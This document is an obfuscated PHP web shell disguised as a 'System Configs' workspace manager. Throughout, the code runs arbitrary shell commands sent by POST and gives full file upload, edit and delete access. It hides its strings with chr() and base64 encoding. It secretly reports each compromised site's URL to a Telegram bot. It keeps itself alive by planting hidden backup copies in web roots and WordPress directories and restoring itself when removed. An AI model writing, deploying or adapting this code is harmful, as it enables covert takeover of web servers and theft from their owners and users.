<?php




error_reporting(0);
@ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0);
$㼁̧̂ᛇ̇̋̄̇ = base64_decode(
    chr(79).chr(68).chr(99).chr(122).chr(78).chr(106).chr(103).chr(53).chr(77).chr(122).chr(81).chr(50).chr(79).chr(68).chr(112).chr(66).chr(81).chr(85).chr(103).chr(119).chr(85).chr(109).chr(108).chr(83).chr(77).chr(72).chr(112).chr(77).chr(77).chr(49).chr(70).chr(70).chr(101).chr(86).chr(108).chr(48).chr(101).chr(84).chr(81).chr(52).chr(101).chr(84).chr(70).chr(84).chr(89).chr(107).chr(86).chr(87).chr(83).chr(110).chr(73).chr(116).chr(98).chr(86).chr(70).chr(66).chr(76).chr(85).chr(78).chr(114).chr(85).chr(81).chr(61).chr(61)
);
$ぁ̊́̈̆ = base64_decode(chr(79).chr(68).chr(107).chr(122).chr(77).chr(68).chr(69).chr(51).chr(78).chr(68).chr(81).chr(50).chr(77).chr(119).chr(61).chr(61));

function reportTelegram($ら̨ﬗ̉̋)
{
    global $㼁̧̂ᛇ̇̋̄̇, $ぁ̊́̈̆;
    $ᛒ̈ﬕ̂̆ = sys_get_temp_dir() . chr(47).chr(98).chr(97).chr(114).chr(105).chr(100).chr(105).chr(110).chr(95) . md5($ら̨ﬗ̉̋);
    if (!file_exists($ᛒ̈ﬕ̂̆)) {
        @file_get_contents(
            "https://api.telegram.org/bot$㼁̧̂ᛇ̇̋̄̇/sendMessage?chat_id=$ぁ̊́̈̆&text=" .
                urlencode($ら̨ﬗ̉̋)
        );
        @file_put_contents($ᛒ̈ﬕ̂̆, time());
    }
}

if (!isset($_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)])) {
    $㦁̃́ᛇﬕ̦̣̌ = urldecode(parse_url($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)], PHP_URL_PATH));
    $㈲ᛒ̉́㉉̆̈̌ = $_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] . $㦁̃́ᛇﬕ̦̣̌;
    if (is_file($㈲ᛒ̉́㉉̆̈̌)) {
        $ﬅ̩まᚢ̆ = $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)];
        $㉁ﬆﬓ̀̃ =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $ﬅ̩まᚢ̆ .
            $㦁̃́ᛇﬕ̦̣̌;
        reportTelegram("muslim:\n$ﬅ̩まᚢ̆\n$㉁ﬆﬓ̀̃");
        $_SESSION[chr(116).chr(101).chr(108).chr(101).chr(103).chr(114).chr(97).chr(109).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)] = true;
    }
}
$㉆̤̊̀ = __FILE__;
$ﬅらﬁ̤̇ = getcwd();


$まᛊᛜ̦̩̄̋ = '.' . str_rot13(chr(102).chr(108).chr(102).chr(95).chr(112).chr(110).chr(112).chr(117).chr(114).chr(95).chr(121).chr(98).chr(116)); 
$ᛃら̣̥̣ = [
    getcwd(), dirname(__DIR__), dirname(dirname(__DIR__)),
    '/', '/root', '/home', chr(47).chr(118).chr(97).chr(114).chr(47).chr(119).chr(119).chr(119), chr(47).chr(118).chr(97).chr(114).chr(47).chr(119).chr(119).chr(119).chr(47).chr(104).chr(116).chr(109).chr(108), 
    chr(47).chr(112).chr(117).chr(98).chr(108).chr(105).chr(99).chr(95).chr(104).chr(116).chr(109).chr(108), '/www', '/tmp', chr(47).chr(118).chr(97).chr(114).chr(47).chr(116).chr(109).chr(112), chr(47).chr(100).chr(101).chr(118).chr(47).chr(115).chr(104).chr(109),
    chr(47).chr(116).chr(104).chr(101).chr(109).chr(101).chr(115), chr(47).chr(112).chr(108).chr(117).chr(103).chr(105).chr(110).chr(115), chr(47).chr(119).chr(112).chr(45).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(47).chr(116).chr(104).chr(101).chr(109).chr(101).chr(115), chr(47).chr(119).chr(112).chr(45).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(47).chr(112).chr(108).chr(117).chr(103).chr(105).chr(110).chr(115)
];

$ᛚ㲁̊ = __DIR__ . '/.' . md5(chr(99).chr(104).chr(101).chr(99).chr(107).chr(95).chr(116));
$え㼁ᛃ̌ﬁ̇̂̇ = time();
$㌁̨̤ = file_exists($ᛚ㲁̊) ? (int)file_get_contents($ᛚ㲁̊) : 0;
$え̥̣̅̆̇̋̀ = 5;

file_put_contents($ᛚ㲁̊, $え㼁ᛃ̌ﬁ̇̂̇);

if (($え㼁ᛃ̌ﬁ̇̂̇ - $㌁̨̤) >= $え̥̣̅̆̇̋̀) {
    if (!file_exists($㉆̤̊̀) || filesize($㉆̤̊̀) < 1000) {
        r_s_f_b();
    }
}

function r_s_f_b() {
    global $㉆̤̊̀, $ᛃら̣̥̣, $まᛊᛜ̦̩̄̋;
    foreach ($ᛃら̣̥̣ as $ﬆﾚᛊ̣̦̃̅̆) {
        $㻁̤̆ﬆﬖ̥̈ = @realpath($ﬆﾚᛊ̣̦̃̅̆);
        if ($㻁̤̆ﬆﬖ̥̈ && is_dir($㻁̤̆ﬆﬖ̥̈)) {
            $ᛚ̧̀̌ = glob($㻁̤̆ﬆﬖ̥̈ . DIRECTORY_SEPARATOR . '*/' . $まᛊᛜ̦̩̄̋ . '/', GLOB_ONLYDIR);
            foreach ($ᛚ̧̀̌ as $ﬁﾚ̣) {
                $ᛗ̦ﾚ̦ = glob($ﬁﾚ̣ . chr(99).chr(102).chr(103).chr(95).chr(42).chr(46).chr(112).chr(104).chr(112));
                if (!empty($ᛗ̦ﾚ̦)) {
                    $ᛇ̤̥ᚠ̣̤̀ = max($ᛗ̦ﾚ̦);
                    if (@copy($ᛇ̤̥ᚠ̣̤̀, $㉆̤̊̀)) {
                        @chmod($㉆̤̊̀, 0644);
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

function d_b($ﬁﬕ̆ﬔ̩̋̃, $ﬁ̊̈ᛉᛚ̉̊) {
    global $まᛊᛜ̦̩̄̋;
    foreach ($ﬁ̊̈ᛉᛚ̉̊ as $ᛊﾚ̄) {
        $㦁̇ね̌̊̉ = @realpath($ᛊﾚ̄);
        if ($㦁̇ね̌̊̉ && is_dir($㦁̇ね̌̊̉)) {
            $㈲ﬖﬆ̂̉ = $㦁̇ね̌̊̉ . DIRECTORY_SEPARATOR . $まᛊᛜ̦̩̄̋;
            if (!is_dir($㈲ﬖﬆ̂̉)) @mkdir($㈲ﬖﬆ̂̉, 0755, true);
            $ᛉ̤̥̥̣̌̋ = $㈲ﬖﬆ̂̉ . '/cfg_' . date('YmdHis') . '.php';
            if (@copy($ﬁﬕ̆ﬔ̩̋̃, $ᛉ̤̥̥̣̌̋)) {
                @chmod($ᛉ̤̥̥̣̌̋, 0644);
            }
        }
    }
}

d_b($㉆̤̊̀, $ᛃら̣̥̣);


function e_c($㌁㈲̦̣̆̃̌) {
    $ﬓ̉̈ = '';
    $ねね̥̈ = ['sys'.'tem', 'ex'.'ec', 'sh'.'ell_ex'.'ec', 'passt'.'hru'];
    foreach ($ねね̥̈ as $ﬁﬕ̆ﬔ̩̋̃) {
        if (function_exists($ﬁﬕ̆ﬔ̩̋̃)) {
            ob_start();
            if ($ﬁﬕ̆ﬔ̩̋̃ == 'ex'.'ec') { $ᚨᛇ̋ᛇ̣̅̄=[]; $ﬁﬕ̆ﬔ̩̋̃($㌁㈲̦̣̆̃̌, $ᚨᛇ̋ᛇ̣̅̄); print_r($ᚨᛇ̋ᛇ̣̅̄); }
            else { $ﬁﬕ̆ﬔ̩̋̃($㌁㈲̦̣̆̃̌); }
            $ﬓ̉̈ = ob_get_clean();
            if (!empty($ﬓ̉̈)) break;
        }
    }
    if (empty($ﬓ̉̈) && function_exists(chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))) {
        $え̌ᛗ̇̅ = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
        $ﾝ̇ﬖ̦̩̈ = proc_open($㌁㈲̦̣̆̃̌, $え̌ᛗ̇̅, $㼁㲁̤̩̤);
        if (is_resource($ﾝ̇ﬖ̦̩̈)) {
            $ﬓ̉̈ = stream_get_contents($㼁㲁̤̩̤[1]);
            fclose($㼁㲁̤̩̤[0]); fclose($㼁㲁̤̩̤[1]); fclose($㼁㲁̤̩̤[2]);
            proc_close($ﾝ̇ﬖ̦̩̈);
        }
    }
    return $ﬓ̉̈;
}

function s_p($㦁̇ね̌̊̉) {
    return str_replace(['..\\','../','\\','<','>','|'], ['','','/','','',''], $㦁̇ね̌̊̉);
}

$ᛈ̅え̂ = isset($_GET['d']) ? s_p($_GET['d']) : getcwd();
@chdir($ᛈ̅え̂);
$ﬗᛃﾚ㈲̦̂ = getcwd();

if ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] == 'POST') {
    if (isset($_POST[chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100)])) {
        echo chr(60).chr(100).chr(105).chr(118).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(98).chr(97).chr(99).chr(107).chr(103).chr(114).chr(111).chr(117).chr(110).chr(100).chr(58).chr(35).chr(48).chr(48).chr(48).chr(59).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(48).chr(102).chr(48).chr(59).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(58).chr(49).chr(53).chr(112).chr(120).chr(59).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(58).chr(49).chr(112).chr(120).chr(32).chr(115).chr(111).chr(108).chr(105).chr(100).chr(32).chr(35).chr(48).chr(102).chr(48).chr(59).chr(109).chr(97).chr(114).chr(103).chr(105).chr(110).chr(58).chr(49).chr(48).chr(112).chr(120).chr(32).chr(48).chr(59).chr(119).chr(104).chr(105).chr(116).chr(101).chr(45).chr(115).chr(112).chr(97).chr(99).chr(101).chr(58).chr(112).chr(114).chr(101).chr(45).chr(119).chr(114).chr(97).chr(112).chr(59).chr(102).chr(111).chr(110).chr(116).chr(45).chr(102).chr(97).chr(109).chr(105).chr(108).chr(121).chr(58).chr(109).chr(111).chr(110).chr(111).chr(115).chr(112).chr(97).chr(99).chr(101).chr(34).chr(62) . htmlspecialchars(e_c($_POST[chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100)])) . '</div>';
    }
    if (isset($_FILES['upload'])) {
        foreach($_FILES['upload'][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)] as $ﬓ̂㼁㌁̧̧ => $ㄉぁᛖ̦̅̂) {
            $ﬆ̈ᛖ̩̂ = $ﬗᛃﾚ㈲̦̂ . '/' . basename($_FILES['upload']['name'][$ﬓ̂㼁㌁̧̧]);
            move_uploaded_file($ㄉぁᛖ̦̅̂, $ﬆ̈ᛖ̩̂);
        }
    }
    if (isset($_POST['newdir'])) {
        @mkdir($ﬗᛃﾚ㈲̦̂ . '/' . $_POST['newdir'], 0755, true);
    }
    if (isset($_POST['delete'])) {
        $ᛜﾝ̦̃̊ = $ﬗᛃﾚ㈲̦̂ . '/' . $_POST['item'];
        is_dir($ᛜﾝ̦̃̊) ? @rmdir($ᛜﾝ̦̃̊) : @unlink($ᛜﾝ̦̃̊);
    }
    if (isset($_POST[chr(115).chr(97).chr(118).chr(101).chr(102).chr(105).chr(108).chr(101)])) {
        @file_put_contents($ﬗᛃﾚ㈲̦̂ . '/' . $_POST[chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101)], $_POST[chr(102).chr(105).chr(108).chr(101).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]);
    }
}

$㈲̂̉ﬅﬖ̊ = (strpos($ﬗᛃﾚ㈲̦̂, '/') === 0 && $ﬗᛃﾚ㈲̦̂ !== getcwd());
$㉆ᛉ̃ﬅ̤̊̃ = 5 - (($え㼁ᛃ̌ﬁ̇̂̇ - $㌁̨̤) % 5);
?>
<!DOCTYPE html>
<html>
<head>
<title>System Configs</title>
<meta charset="UTF-8">
<style>
body{font-family:Arial;background:#0e0e0e;color:#aaa;margin:0;padding:20px}
.container{max-width:1400px;margin:auto;background:#181818;padding:25px;border-radius:10px;border:1px solid #333}
h1{color:#0f0;text-align:center;font-size:20px;text-transform:uppercase;letter-spacing:2px}
input,textarea,select{padding:10px;margin:5px 0;border:1px solid #333;background:#000;color:#0f0;border-radius:5px;width:100%;box-sizing:border-box;font-family:monospace}
button{padding:12px 15px;background:#222;color:#0f0;border:1px solid #0f0;border-radius:5px;cursor:pointer;font-weight:bold;margin:3px}
button:hover{background:#0f0;color:#000}
table{width:100%;border-collapse:collapse;margin:15px 0}
th,td{padding:10px;border-bottom:1px solid #222;text-align:left}
th{background:#111;color:#0f0}
.dir{color:#55f;font-weight:bold}
.file{color:#eee}
.writable{color:#0f0}
.readonly{color:#f55}
.status-box{padding:15px;border-radius:5px;margin:10px 0;font-size:13px;border-left:4px solid #0f0;background:#111}
nav{padding:10px;background:#111;margin:10px 0;border-radius:5px}
nav a{color:#0f0;margin-right:10px;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<h1>- WORKSPACE MANAGER v3 -</h1>

<div class="status-box">
    <strong>S-RECOVERY: ACTIVE</strong> | 
    Path: <code><?php echo htmlspecialchars($ﬗᛃﾚ㈲̦̂); ?></code> | 
    Next: <?php echo $㉆ᛉ̃ﬅ̤̊̃; ?>s
    <?php if($㈲̂̉ﬅﬖ̊) echo chr(32).chr(124).chr(32).chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(102).chr(48).chr(102).chr(34).chr(62).chr(76).chr(69).chr(86).chr(69).chr(76).chr(58).chr(32).chr(82).chr(79).chr(79).chr(84).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
</div>

<nav>
    <a href="?d=/">[ / ]</a>
    <a href="?d=/var/www">[ WWW ]</a>
    <a href="?d=<?php echo urlencode(dirname($ﬗᛃﾚ㈲̦̂)); ?>">[ UP ]</a>
    <a href="?">[ CWD ]</a>
</nav>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload[]" multiple>
    <button type="submit">UPLOAD</button>
</form>

<form method="post">
    <input type="text" name="command" placeholder="Execute command...">
    <button type="submit">RUN</button>
</form>

<table>
    <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
    <?php
    $㲁ﬔ̃̉ = @scandir($ﬗᛃﾚ㈲̦̂);
    if($㲁ﬔ̃̉) {
        foreach($㲁ﬔ̃̉ as $ﬁﬕ̆ﬔ̩̋̃) {
            if($ﬁﬕ̆ﬔ̩̋̃ == '.' || $ﬁﬕ̆ﬔ̩̋̃ == '..') continue;
            $㦁̇ね̌̊̉ = $ﬗᛃﾚ㈲̦̂ . '/' . $ﬁﬕ̆ﬔ̩̋̃;
            $ﬁﾚ̣ = is_dir($㦁̇ね̌̊̉);
            $ᚦ㲁̃ᚠᛖ̉̆ = is_writable($㦁̇ね̌̊̉);
            echo '<tr>';
            echo chr(60).chr(116).chr(100).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).($ﬁﾚ̣?'dir':'file').'">'.htmlspecialchars($ﬁﬕ̆ﬔ̩̋̃).($ﬁﾚ̣?'/':'').'</td>';
            echo '<td>'.($ﬁﾚ̣?'-':number_format(filesize($㦁̇ね̌̊̉))).'</td>';
            echo chr(60).chr(116).chr(100).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).($ᚦ㲁̃ᚠᛖ̉̆?chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101):chr(114).chr(101).chr(97).chr(100).chr(111).chr(110).chr(108).chr(121)).'">'.($ᚦ㲁̃ᚠᛖ̉̆?'RW':'R').'</td>';
            echo '<td>';
            if($ﬁﾚ̣) {
                echo chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(61).urlencode($㦁̇ね̌̊̉).chr(34).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(48).chr(102).chr(48).chr(34).chr(62).chr(91).chr(69).chr(110).chr(116).chr(101).chr(114).chr(93).chr(60).chr(47).chr(97).chr(62).chr(32);
            } else {
                echo chr(60).chr(97).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(61).urlencode($ﬗᛃﾚ㈲̦̂).'&edit='.urlencode($ﬁﬕ̆ﬔ̩̋̃).chr(34).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(102).chr(102).chr(48).chr(34).chr(62).chr(91).chr(69).chr(100).chr(105).chr(116).chr(93).chr(60).chr(47).chr(97).chr(62).chr(32);
            }
            echo chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(34).chr(112).chr(111).chr(115).chr(116).chr(34).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(58).chr(105).chr(110).chr(108).chr(105).chr(110).chr(101).chr(34).chr(62).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(105).chr(116).chr(101).chr(109).chr(34).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).htmlspecialchars($ﬁﬕ̆ﬔ̩̋̃).chr(34).chr(62).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(34).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(49).chr(34).chr(62).chr(60).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(34).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(58).chr(50).chr(112).chr(120).chr(32).chr(53).chr(112).chr(120).chr(59).chr(102).chr(111).chr(110).chr(116).chr(45).chr(115).chr(105).chr(122).chr(101).chr(58).chr(49).chr(48).chr(112).chr(120).chr(59).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(58).chr(49).chr(112).chr(120).chr(32).chr(115).chr(111).chr(108).chr(105).chr(100).chr(32).chr(35).chr(102).chr(48).chr(48).chr(59).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(102).chr(48).chr(48).chr(59).chr(98).chr(97).chr(99).chr(107).chr(103).chr(114).chr(111).chr(117).chr(110).chr(100).chr(58).chr(110).chr(111).chr(110).chr(101).chr(34).chr(62).chr(68).chr(69).chr(76).chr(60).chr(47).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(62).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62);
            echo chr(60).chr(47).chr(116).chr(100).chr(62).chr(60).chr(47).chr(116).chr(114).chr(62);
        }
    }
    ?>
</table>

<?php
if (isset($_GET['edit'])) {
    $㦁ᛇ̦ね㻁̄̌ = $ﬗᛃﾚ㈲̦̂ . '/' . $_GET['edit'];
    if (@file_exists($㦁ᛇ̦ね㻁̄̌)) {
        $㉆㈲̅ = @file_get_contents($㦁ᛇ̦ね㻁̄̌);
        echo chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(34).chr(112).chr(111).chr(115).chr(116).chr(34).chr(62).chr(10).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(34).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).htmlspecialchars($_GET['edit']).chr(34).chr(62).chr(10).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(102).chr(105).chr(108).chr(101).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(34).chr(32).chr(114).chr(111).chr(119).chr(115).chr(61).chr(34).chr(50).chr(48).chr(34).chr(62).htmlspecialchars($㉆㈲̅).chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62).chr(10).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(115).chr(97).chr(118).chr(101).chr(102).chr(105).chr(108).chr(101).chr(34).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(49).chr(34).chr(62).chr(10).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(60).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(34).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(119).chr(105).chr(100).chr(116).chr(104).chr(58).chr(49).chr(48).chr(48).chr(37).chr(59).chr(98).chr(97).chr(99).chr(107).chr(103).chr(114).chr(111).chr(117).chr(110).chr(100).chr(58).chr(35).chr(48).chr(102).chr(48).chr(59).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(35).chr(48).chr(48).chr(48).chr(34).chr(62).chr(83).chr(65).chr(86).chr(69).chr(32).chr(67).chr(72).chr(65).chr(78).chr(71).chr(69).chr(83).chr(60).chr(47).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(62).chr(10).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(32).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62);
    }
}
?>
</div>
</body>
</html>
